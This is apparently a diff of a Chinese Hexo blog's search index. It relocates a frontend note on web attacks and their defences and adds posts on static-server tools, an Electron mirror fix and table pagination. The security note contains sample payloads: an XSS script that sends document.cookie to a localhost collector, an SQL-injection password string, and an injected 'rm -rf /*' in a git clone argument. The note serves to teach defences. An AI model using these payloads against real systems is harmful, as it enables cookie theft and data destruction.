@@ -724,6 +724,63 @@
       </tags>
   </entry>
   <entry>
+    <title>web安全问题及防御</title>
+    <url>/20200913/111312.html</url>
+    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
+<p>随着互联网的发展，涉及网络安全的问题不可忽视，而作为一名前端工程师，了解网络安全相关的知识也是有必要的，在这里对一些常见的web安全问题及防御手段做个简单的笔记整理。</p>
+</blockquote>
+<a id="more"></a>
+
+<h5 id="1、XSS攻击-跨站点脚本攻击–cross-site-scripting"><a href="#1、XSS攻击-跨站点脚本攻击–cross-site-scripting" class="headerlink" title="1、XSS攻击(跨站点脚本攻击–cross site scripting)"></a>1、XSS攻击(跨站点脚本攻击–cross site scripting)</h5><p>通过存在安全漏洞的web网站注册用户的浏览器内运行非法的HTML标签或Javascript进行的一种攻击。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">通常会找那些输入框或者地址参数栏进行测试，看是否能执行脚本，是否存在漏洞</span><br><span class="line">例如</span><br><span class="line">	http:<span class="comment">//localhost:3000?from=china;</span></span><br><span class="line">修改成</span><br><span class="line">	http:<span class="comment">//localhost:3000?from=&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"> </span><br><span class="line">如果有弹出框，证明存在漏洞，可以插入脚本进行攻击</span><br><span class="line"></span><br><span class="line">例如</span><br><span class="line">	http:<span class="comment">//localhost:3000?from=&lt;script src=&quot;http://localhost:4000/getImg.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">	</span><br><span class="line">getImg.js如下:</span><br><span class="line">	<span class="keyword">let</span> img=<span class="keyword">new</span> Image();</span><br><span class="line">	img.src<span class="string">&quot;http://localhost:4000?cookie=document.cookie&quot;</span>;</span><br><span class="line"></span><br><span class="line">这样 http:<span class="comment">//localhost:4000就能通过图片的请求处理拿到客户端的cookie</span></span><br><span class="line">	<span class="keyword">let</span> cookie=req.cookie;</span><br><span class="line">	<span class="built_in">console</span>.log(cookie);</span><br><span class="line">	</span><br><span class="line">XSS的危害:</span><br><span class="line">	<span class="number">1</span>、获取页面数据</span><br><span class="line">	<span class="number">2</span>、获取cookies</span><br><span class="line">	<span class="number">3</span>、发送请求</span><br><span class="line">	<span class="number">4</span>、劫持前端逻辑</span><br><span class="line">	<span class="number">5</span>、偷取网站的任意数据</span><br><span class="line">	<span class="number">6</span>、偷取用户的资料</span><br><span class="line">	<span class="number">7</span>、偷取用户的秘密和登录态</span><br><span class="line">	<span class="number">8</span>、欺骗用户</span><br><span class="line">	</span><br><span class="line">防御手段:</span><br><span class="line"><span class="number">1</span>、响应头部字段X-Xss-Protection</span><br><span class="line">	<span class="number">0</span>：禁止XSS过滤</span><br><span class="line">	<span class="number">1</span>:启用XSS过滤，浏览器默认启用，如果检测到攻击，浏览器将清除页面(删除不安全的部分)</span><br><span class="line">	<span class="number">1</span>;mode=block启用XSS过滤，如果检测到攻击，浏览器将不会清除页面，而是阻塞页面加载</span><br><span class="line">	<span class="number">1</span>;report=(Chromium  only)</span><br><span class="line">	启用XSS过滤。如果检测到跨站脚本攻击，浏览器将清除⻚⾯并使⽤CSP report-uri 指令的功能发送违规报告。</span><br><span class="line"><span class="number">2</span>、ejs转义 </span><br><span class="line">	&lt;% code %&gt;用于执行其中javascript代码</span><br><span class="line">	&lt;%= code %&gt;会对code进行html转义</span><br><span class="line">	&lt;%- code %&gt;将不会进行转义</span><br><span class="line">	</span><br><span class="line"><span class="number">3</span>、CSP(Content Security Policy) 内容安全策略</span><br><span class="line">	script-src:<span class="string">&#x27;self-src&#x27;</span></span><br><span class="line">	</span><br><span class="line"><span class="number">4</span>、转义字符</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、黑名单和白名单</span><br><span class="line">用户的输入永远不可信任的，最普遍的做法就是转义输⼊输出的内容，对于引号、尖括号、斜</span><br><span class="line">杠进行转义富文本来说，显然不能通过上⾯的办法来转义所有字符，因为这样会把需要的格式也过滤掉。</span><br><span class="line">对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过</span><br><span class="line">滤的标签和标签属性实在太多，更加推荐使用白名单的方式</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、响应头部字段<span class="built_in">Set</span>-Cookie 设置为HttpOnly  客户端就不能通过<span class="built_in">document</span>.cookie访问到cookie了</span><br><span class="line">	例如:</span><br><span class="line">		res.setHeader(<span class="string">&#x27;Set-Cookit&#x27;</span>,<span class="string">&#x27;uid=123; HttpOnly&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="2、CSRF攻击-跨站伪造请求–cross-site-request-forgery"><a href="#2、CSRF攻击-跨站伪造请求–cross-site-request-forgery" class="headerlink" title="2、CSRF攻击(跨站伪造请求–cross site request forgery)"></a>2、CSRF攻击(跨站伪造请求–cross site request forgery)</h5><p>利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、用户已经登录了站点 A，并在本地记录了 cookie</span><br><span class="line"><span class="number">2</span>、在用户没有登出站点 A 的情况下（也就是 cookie 有效的情况下），访问了恶意攻击者提供的引</span><br><span class="line">诱危险站点 B (B 站点要求访问站点A)。</span><br><span class="line"><span class="number">3</span>、站点 A 没有做任何 CSRF 防御</span><br><span class="line"></span><br><span class="line">CSRF的危害：</span><br><span class="line">	<span class="number">1</span>、利用用户登录态</span><br><span class="line">	<span class="number">2</span>、用户不知情</span><br><span class="line">	<span class="number">3</span>、完成业务请求</span><br><span class="line">	<span class="number">4</span>、盗取用户资金（转账，消费）</span><br><span class="line">	<span class="number">5</span>、冒充用户发帖背锅</span><br><span class="line">	<span class="number">6</span>、损害用站声誉</span><br><span class="line"></span><br><span class="line">防御手段:</span><br><span class="line">	<span class="number">1</span>、referer check  校验来源  但是https不显示referer 而且可伪造</span><br><span class="line">	<span class="number">2</span>、验证码(最有效)</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="3、点击劫持-clickjacking"><a href="#3、点击劫持-clickjacking" class="headerlink" title="3、点击劫持(clickjacking)"></a>3、点击劫持(clickjacking)</h5><p>点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式式嵌入自己<br>的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">通过视觉欺骗手段将引诱点击的按钮和iframe的网站提交按钮重叠</span><br><span class="line"></span><br><span class="line">防御手段：</span><br><span class="line"><span class="number">1</span>、响应头字段X-IFRAME-OPTIONS</span><br><span class="line">	DENY,表示页面不允许通过iframe的方式展示</span><br><span class="line">	SAMEORIGIN，表示页面可以在相同域名下通过iframe的方式展示</span><br><span class="line">	ARROW-FROM，表示页面可以在指定来源的iframe中显示</span><br><span class="line">	</span><br><span class="line">	res.setHeader(<span class="string">&#x27;X-FRAME-OPTIONS&#x27;</span>,<span class="string">&#x27;DENY)</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	防御用 iframe 嵌套的点击劫持攻击</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">2、JS方式(古老的手段)</span></span><br><span class="line"><span class="string">	判断self是否和top相等</span></span><br><span class="line"><span class="string">	如果相等，则没事，</span></span><br><span class="line"><span class="string">	如果不相等，则为通过iframe来访问的，</span></span><br><span class="line"><span class="string">	让top.location=self.location</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="4、SQL注入"><a href="#4、SQL注入" class="headerlink" title="4、SQL注入"></a>4、SQL注入</h5><p>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>
+<p>例如特殊”密码”：1’or’1’=’1’</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 拼接后的SQL</span></span><br><span class="line">SELECT *</span><br><span class="line">FROM test.user</span><br><span class="line">WHERE username = <span class="string">&#x27;laowang&#x27;</span></span><br><span class="line">AND password = <span class="string">&#x27;1&#x27;</span>or<span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">用or达到一个怎么都正确的结果</span><br><span class="line"></span><br><span class="line">防御手段:</span><br><span class="line"><span class="number">1</span>、所有的查询语句建议使用数据库提供的参数化查询接口**，参数化的语句使用参数而不是将用户</span><br><span class="line">输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的</span><br><span class="line">query 方法中的 ? 占位参数。</span><br><span class="line"><span class="number">2</span>、严格限制Web应用的数据库的操作权限**，给此用户提供仅仅能够满足其工作的最低权限，从而</span><br><span class="line">最大限度的减少注入攻击对数据库的危害</span><br><span class="line"><span class="number">3</span>、后端代码检查输入的数据是否符合预期**，严格限制变量的类型，例如使用正则表达式进行一些</span><br><span class="line">匹配处理。</span><br><span class="line"><span class="number">4</span>、对进入数据库的特殊字符（<span class="string">&#x27;， &quot;， \， &lt;， &gt;， &amp;， *， ; 等）进行转义处理，或编码转换**。基本上</span></span><br><span class="line"><span class="string">所有的后端语言都有对字符串进行转义处理的方法，例如 lodash 的 lodash._escapehtmlchar</span></span><br><span class="line"><span class="string">库</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="5、OS注入"><a href="#5、OS注入" class="headerlink" title="5、OS注入"></a>5、OS注入</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">和SQL差不多，不过是针对操作系统的</span><br><span class="line"><span class="comment">// 以 Node.js 为例，假如在接口中需要从 github 下载用户指定的 repo</span></span><br><span class="line"><span class="keyword">const</span> exec = <span class="built_in">require</span>(<span class="string">&#x27;mz/child_process&#x27;</span>).exec;</span><br><span class="line"><span class="keyword">let</span> params = &#123;<span class="comment">/* 用户输入的参数 */</span>&#125;;</span><br><span class="line">exec(<span class="string">`git clone <span class="subst">$&#123;params.repo&#125;</span> /some/path`</span>);</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//github.com/xx/xx.git &amp;&amp; rm -rf /* &amp;&amp;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="6、请求劫持"><a href="#6、请求劫持" class="headerlink" title="6、请求劫持"></a>6、请求劫持</h5><ul>
+<li><p>DNS劫持</p>
+<blockquote>
+<p>顾名思义， DNS服务器(DNS解析各个步骤)被篡改，修改了域名解析的结果，使得访问到的不是预期的ip</p>
+</blockquote>
+</li>
+<li><p>HTTP劫持 </p>
+<blockquote>
+<p>运营商劫持，此时大概只能升级HTTPS了</p>
+</blockquote>
+<p>  防御手段：    </p>
+<pre><code>  使用https安全协议</code></pre>
+</li>
+</ul>
+<h5 id="7、DDOS攻击-分布式拒绝服务攻击–distributed-denial-of-service"><a href="#7、DDOS攻击-分布式拒绝服务攻击–distributed-denial-of-service" class="headerlink" title="7、DDOS攻击(分布式拒绝服务攻击–distributed denial of service)"></a>7、DDOS攻击(分布式拒绝服务攻击–distributed denial of service)</h5><p>DDOS 不是一种攻击，而是一大类攻击的总称。它有几十种类型，新的攻击方法还在不断发明出来。网站站运行的各个环节，都可以是攻击目标。只要把一个环节攻破，使得整个流程跑不起来，就达到了瘫痪服务的目的。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">其中，比较常见的一种攻击是 cc 攻击。它就是简单粗暴地送来⼤量正常的请求，超出服务器的最⼤承</span><br><span class="line">受量，导致宕机。</span><br><span class="line"></span><br><span class="line">防御手段：</span><br><span class="line">	<span class="number">1</span>、备份网站</span><br><span class="line">	备份网站不一定是全功能的，如果能做到全静态浏览，就能满足需求。最低限度应该可以显示公</span><br><span class="line">	告，告诉用户，网站出了问题，正在全力抢修。</span><br><span class="line">	<span class="number">2</span>、HTTP 请求的拦截</span><br><span class="line">	<span class="number">3</span>、硬件 服务器 防火墙</span><br><span class="line">	- 带宽扩容 + CDN</span><br><span class="line">	提高犯罪成本</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用Chrome开发工具排查页面性能问题</title>
     <url>/20200925/082122.html</url>
     <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
@@ -815,63 +872,6 @@
       </categories>
       <tags>
         <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>web安全问题及防御</title>
-    <url>/20200913/111312.html</url>
-    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
-<p>随着互联网的发展，涉及网络安全的问题不可忽视，而作为一名前端工程师，了解网络安全相关的知识也是有必要的，在这里对一些常见的web安全问题及防御手段做个简单的笔记整理。</p>
-</blockquote>
-<a id="more"></a>
-
-<h5 id="1、XSS攻击-跨站点脚本攻击–cross-site-scripting"><a href="#1、XSS攻击-跨站点脚本攻击–cross-site-scripting" class="headerlink" title="1、XSS攻击(跨站点脚本攻击–cross site scripting)"></a>1、XSS攻击(跨站点脚本攻击–cross site scripting)</h5><p>通过存在安全漏洞的web网站注册用户的浏览器内运行非法的HTML标签或Javascript进行的一种攻击。</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">通常会找那些输入框或者地址参数栏进行测试，看是否能执行脚本，是否存在漏洞</span><br><span class="line">例如</span><br><span class="line">	http:<span class="comment">//localhost:3000?from=china;</span></span><br><span class="line">修改成</span><br><span class="line">	http:<span class="comment">//localhost:3000?from=&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"> </span><br><span class="line">如果有弹出框，证明存在漏洞，可以插入脚本进行攻击</span><br><span class="line"></span><br><span class="line">例如</span><br><span class="line">	http:<span class="comment">//localhost:3000?from=&lt;script src=&quot;http://localhost:4000/getImg.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">	</span><br><span class="line">getImg.js如下:</span><br><span class="line">	<span class="keyword">let</span> img=<span class="keyword">new</span> Image();</span><br><span class="line">	img.src<span class="string">&quot;http://localhost:4000?cookie=document.cookie&quot;</span>;</span><br><span class="line"></span><br><span class="line">这样 http:<span class="comment">//localhost:4000就能通过图片的请求处理拿到客户端的cookie</span></span><br><span class="line">	<span class="keyword">let</span> cookie=req.cookie;</span><br><span class="line">	<span class="built_in">console</span>.log(cookie);</span><br><span class="line">	</span><br><span class="line">XSS的危害:</span><br><span class="line">	<span class="number">1</span>、获取页面数据</span><br><span class="line">	<span class="number">2</span>、获取cookies</span><br><span class="line">	<span class="number">3</span>、发送请求</span><br><span class="line">	<span class="number">4</span>、劫持前端逻辑</span><br><span class="line">	<span class="number">5</span>、偷取网站的任意数据</span><br><span class="line">	<span class="number">6</span>、偷取用户的资料</span><br><span class="line">	<span class="number">7</span>、偷取用户的秘密和登录态</span><br><span class="line">	<span class="number">8</span>、欺骗用户</span><br><span class="line">	</span><br><span class="line">防御手段:</span><br><span class="line"><span class="number">1</span>、响应头部字段X-Xss-Protection</span><br><span class="line">	<span class="number">0</span>：禁止XSS过滤</span><br><span class="line">	<span class="number">1</span>:启用XSS过滤，浏览器默认启用，如果检测到攻击，浏览器将清除页面(删除不安全的部分)</span><br><span class="line">	<span class="number">1</span>;mode=block启用XSS过滤，如果检测到攻击，浏览器将不会清除页面，而是阻塞页面加载</span><br><span class="line">	<span class="number">1</span>;report=(Chromium  only)</span><br><span class="line">	启用XSS过滤。如果检测到跨站脚本攻击，浏览器将清除⻚⾯并使⽤CSP report-uri 指令的功能发送违规报告。</span><br><span class="line"><span class="number">2</span>、ejs转义 </span><br><span class="line">	&lt;% code %&gt;用于执行其中javascript代码</span><br><span class="line">	&lt;%= code %&gt;会对code进行html转义</span><br><span class="line">	&lt;%- code %&gt;将不会进行转义</span><br><span class="line">	</span><br><span class="line"><span class="number">3</span>、CSP(Content Security Policy) 内容安全策略</span><br><span class="line">	script-src:<span class="string">&#x27;self-src&#x27;</span></span><br><span class="line">	</span><br><span class="line"><span class="number">4</span>、转义字符</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、黑名单和白名单</span><br><span class="line">用户的输入永远不可信任的，最普遍的做法就是转义输⼊输出的内容，对于引号、尖括号、斜</span><br><span class="line">杠进行转义富文本来说，显然不能通过上⾯的办法来转义所有字符，因为这样会把需要的格式也过滤掉。</span><br><span class="line">对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过</span><br><span class="line">滤的标签和标签属性实在太多，更加推荐使用白名单的方式</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、响应头部字段<span class="built_in">Set</span>-Cookie 设置为HttpOnly  客户端就不能通过<span class="built_in">document</span>.cookie访问到cookie了</span><br><span class="line">	例如:</span><br><span class="line">		res.setHeader(<span class="string">&#x27;Set-Cookit&#x27;</span>,<span class="string">&#x27;uid=123; HttpOnly&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="2、CSRF攻击-跨站伪造请求–cross-site-request-forgery"><a href="#2、CSRF攻击-跨站伪造请求–cross-site-request-forgery" class="headerlink" title="2、CSRF攻击(跨站伪造请求–cross site request forgery)"></a>2、CSRF攻击(跨站伪造请求–cross site request forgery)</h5><p>利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、用户已经登录了站点 A，并在本地记录了 cookie</span><br><span class="line"><span class="number">2</span>、在用户没有登出站点 A 的情况下（也就是 cookie 有效的情况下），访问了恶意攻击者提供的引</span><br><span class="line">诱危险站点 B (B 站点要求访问站点A)。</span><br><span class="line"><span class="number">3</span>、站点 A 没有做任何 CSRF 防御</span><br><span class="line"></span><br><span class="line">CSRF的危害：</span><br><span class="line">	<span class="number">1</span>、利用用户登录态</span><br><span class="line">	<span class="number">2</span>、用户不知情</span><br><span class="line">	<span class="number">3</span>、完成业务请求</span><br><span class="line">	<span class="number">4</span>、盗取用户资金（转账，消费）</span><br><span class="line">	<span class="number">5</span>、冒充用户发帖背锅</span><br><span class="line">	<span class="number">6</span>、损害用站声誉</span><br><span class="line"></span><br><span class="line">防御手段:</span><br><span class="line">	<span class="number">1</span>、referer check  校验来源  但是https不显示referer 而且可伪造</span><br><span class="line">	<span class="number">2</span>、验证码(最有效)</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="3、点击劫持-clickjacking"><a href="#3、点击劫持-clickjacking" class="headerlink" title="3、点击劫持(clickjacking)"></a>3、点击劫持(clickjacking)</h5><p>点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式式嵌入自己<br>的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">通过视觉欺骗手段将引诱点击的按钮和iframe的网站提交按钮重叠</span><br><span class="line"></span><br><span class="line">防御手段：</span><br><span class="line"><span class="number">1</span>、响应头字段X-IFRAME-OPTIONS</span><br><span class="line">	DENY,表示页面不允许通过iframe的方式展示</span><br><span class="line">	SAMEORIGIN，表示页面可以在相同域名下通过iframe的方式展示</span><br><span class="line">	ARROW-FROM，表示页面可以在指定来源的iframe中显示</span><br><span class="line">	</span><br><span class="line">	res.setHeader(<span class="string">&#x27;X-FRAME-OPTIONS&#x27;</span>,<span class="string">&#x27;DENY)</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	防御用 iframe 嵌套的点击劫持攻击</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">2、JS方式(古老的手段)</span></span><br><span class="line"><span class="string">	判断self是否和top相等</span></span><br><span class="line"><span class="string">	如果相等，则没事，</span></span><br><span class="line"><span class="string">	如果不相等，则为通过iframe来访问的，</span></span><br><span class="line"><span class="string">	让top.location=self.location</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="4、SQL注入"><a href="#4、SQL注入" class="headerlink" title="4、SQL注入"></a>4、SQL注入</h5><p>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>
-<p>例如特殊”密码”：1’or’1’=’1’</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 拼接后的SQL</span></span><br><span class="line">SELECT *</span><br><span class="line">FROM test.user</span><br><span class="line">WHERE username = <span class="string">&#x27;laowang&#x27;</span></span><br><span class="line">AND password = <span class="string">&#x27;1&#x27;</span>or<span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">用or达到一个怎么都正确的结果</span><br><span class="line"></span><br><span class="line">防御手段:</span><br><span class="line"><span class="number">1</span>、所有的查询语句建议使用数据库提供的参数化查询接口**，参数化的语句使用参数而不是将用户</span><br><span class="line">输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的</span><br><span class="line">query 方法中的 ? 占位参数。</span><br><span class="line"><span class="number">2</span>、严格限制Web应用的数据库的操作权限**，给此用户提供仅仅能够满足其工作的最低权限，从而</span><br><span class="line">最大限度的减少注入攻击对数据库的危害</span><br><span class="line"><span class="number">3</span>、后端代码检查输入的数据是否符合预期**，严格限制变量的类型，例如使用正则表达式进行一些</span><br><span class="line">匹配处理。</span><br><span class="line"><span class="number">4</span>、对进入数据库的特殊字符（<span class="string">&#x27;， &quot;， \， &lt;， &gt;， &amp;， *， ; 等）进行转义处理，或编码转换**。基本上</span></span><br><span class="line"><span class="string">所有的后端语言都有对字符串进行转义处理的方法，例如 lodash 的 lodash._escapehtmlchar</span></span><br><span class="line"><span class="string">库</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="5、OS注入"><a href="#5、OS注入" class="headerlink" title="5、OS注入"></a>5、OS注入</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">和SQL差不多，不过是针对操作系统的</span><br><span class="line"><span class="comment">// 以 Node.js 为例，假如在接口中需要从 github 下载用户指定的 repo</span></span><br><span class="line"><span class="keyword">const</span> exec = <span class="built_in">require</span>(<span class="string">&#x27;mz/child_process&#x27;</span>).exec;</span><br><span class="line"><span class="keyword">let</span> params = &#123;<span class="comment">/* 用户输入的参数 */</span>&#125;;</span><br><span class="line">exec(<span class="string">`git clone <span class="subst">$&#123;params.repo&#125;</span> /some/path`</span>);</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//github.com/xx/xx.git &amp;&amp; rm -rf /* &amp;&amp;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="6、请求劫持"><a href="#6、请求劫持" class="headerlink" title="6、请求劫持"></a>6、请求劫持</h5><ul>
-<li><p>DNS劫持</p>
-<blockquote>
-<p>顾名思义， DNS服务器(DNS解析各个步骤)被篡改，修改了域名解析的结果，使得访问到的不是预期的ip</p>
-</blockquote>
-</li>
-<li><p>HTTP劫持 </p>
-<blockquote>
-<p>运营商劫持，此时大概只能升级HTTPS了</p>
-</blockquote>
-<p>  防御手段：    </p>
-<pre><code>  使用https安全协议</code></pre>
-</li>
-</ul>
-<h5 id="7、DDOS攻击-分布式拒绝服务攻击–distributed-denial-of-service"><a href="#7、DDOS攻击-分布式拒绝服务攻击–distributed-denial-of-service" class="headerlink" title="7、DDOS攻击(分布式拒绝服务攻击–distributed denial of service)"></a>7、DDOS攻击(分布式拒绝服务攻击–distributed denial of service)</h5><p>DDOS 不是一种攻击，而是一大类攻击的总称。它有几十种类型，新的攻击方法还在不断发明出来。网站站运行的各个环节，都可以是攻击目标。只要把一个环节攻破，使得整个流程跑不起来，就达到了瘫痪服务的目的。</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">其中，比较常见的一种攻击是 cc 攻击。它就是简单粗暴地送来⼤量正常的请求，超出服务器的最⼤承</span><br><span class="line">受量，导致宕机。</span><br><span class="line"></span><br><span class="line">防御手段：</span><br><span class="line">	<span class="number">1</span>、备份网站</span><br><span class="line">	备份网站不一定是全功能的，如果能做到全静态浏览，就能满足需求。最低限度应该可以显示公</span><br><span class="line">	告，告诉用户，网站出了问题，正在全力抢修。</span><br><span class="line">	<span class="number">2</span>、HTTP 请求的拦截</span><br><span class="line">	<span class="number">3</span>、硬件 服务器 防火墙</span><br><span class="line">	- 带宽扩容 + CDN</span><br><span class="line">	提高犯罪成本</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>安全</tag>
       </tags>
   </entry>
   <entry>
@@ -1040,6 +1040,139 @@
       </categories>
       <tags>
         <tag>本地存储，IndexDB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>推荐快速搭建本地静态资源服务器的两款工具</title>
+    <url>/20201020/071228.html</url>
+    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
+<p>如果有一个资源文件夹，通过<code>file</code>协议直接打开的话，不能发送<code>ajax</code>请求，得在<code>http</code>协议下才能使用<code>ajax</code>发送请求，这时候，我们就需要在该目录下创建静态资源服务器，以前都是通过IDE的一些插件或者功能模块来启用服务，现在推荐两款好用的工具来帮助我们快速搭建起静态资源服务器。</p>
+</blockquote>
+<a id="more"></a>
+
+<h5 id="1、http-server"><a href="#1、http-server" class="headerlink" title="1、http-server"></a>1、http-server</h5><p>安装：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm i -g http-server</span><br></pre></td></tr></table></figure>
+
+<p>使用：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 进入到你的资源目录</span></span><br><span class="line">cd my-src</span><br><span class="line"><span class="comment">// 执行命令</span></span><br><span class="line">http-server .</span><br></pre></td></tr></table></figure>
+
+<p>这样就启动了该目录的静态资源服务，如果该目录存在<code>index.html</code>文件，则会显示该页面为主页，如果不存在<code>index.html</code>文件，则显示该目录静态资源列表。</p>
+<p><a href="https://github.com/http-party/http-server">github传送门</a></p>
+<h5 id="2、anywhere"><a href="#2、anywhere" class="headerlink" title="2、anywhere"></a>2、anywhere</h5><p>安装：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm i -g anywhere</span><br></pre></td></tr></table></figure>
+
+<p>使用：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 进入到你的资源目录</span></span><br><span class="line">cd my-src</span><br><span class="line"><span class="comment">// 执行命令</span></span><br><span class="line">anywhere .</span><br></pre></td></tr></table></figure>
+
+<p><code>anywhere</code>默认启动服务后自动打开页面。</p>
+<p><a href="https://github.com/Rob--W/cors-anywhere">github传送门</a></p>
+]]></content>
+      <categories>
+        <category>实用工具</category>
+      </categories>
+      <tags>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>解决electron依赖包安装失败的问题</title>
+    <url>/20201019/074625.html</url>
+    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
+<p>在使用npm安装electron依赖包的时候，进度老是卡住，导致安装失败。于是上网查询了一下，主要的还是要修改一下electron依赖包的镜像源，这样就能解决这个安装耗时失败的问题，亲测有效。</p>
+</blockquote>
+<a id="more"></a>
+
+<p>首先设置npm的electron镜像源：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm config set ELECTRON_MIRROR <span class="string">&quot;https://cdn.npm.taobao.org/dist/electron/&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后就可以全局安装<code>electron</code>了</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm i -g electron</span><br></pre></td></tr></table></figure>
+
+<p>最后<code>electron -v</code>可以得知<code>electron</code>安装成功</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">electron -v</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>electron</category>
+      </categories>
+      <tags>
+        <tag>electron</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次基于el-table组件的前端分页</title>
+    <url>/20201022/072037.html</url>
+    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
+<p>今天，在和后端同事对接口的时候，有个需要分页的接口，由于数据量不大，他是一次性返回给我，希望由我这边进行分页处理。于是，我这边基于<code>el-table</code>表格组件进行了前端的表格分页处理，在这里做个记录。</p>
+</blockquote>
+<a id="more"></a>
+
+<h5 id="核心代码："><a href="#核心代码：" class="headerlink" title="核心代码："></a>核心代码：</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">el-table</span> <span class="attr">:data</span>=<span class="string">&quot;tabelData.slice((pageIndex - 1) * pageSize, pageIndex * pageSize)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">el-table</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="slice说明："><a href="#slice说明：" class="headerlink" title="slice说明："></a><code>slice</code>说明：</h5><blockquote>
+<p><code>arrayObject.slice(start, end)</code>返回一个新的数组，包含从 start 到 end （不包括该元素）的 arrayObject 中的元素。</p>
+</blockquote>
+<p>这样，就快速简单地实现了基于<code>el-table</code>的前端分页处理。</p>
+]]></content>
+      <categories>
+        <category>问题记录</category>
+      </categories>
+      <tags>
+        <tag>问题记录</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Electron</title>
+    <url>/20201016/033734.html</url>
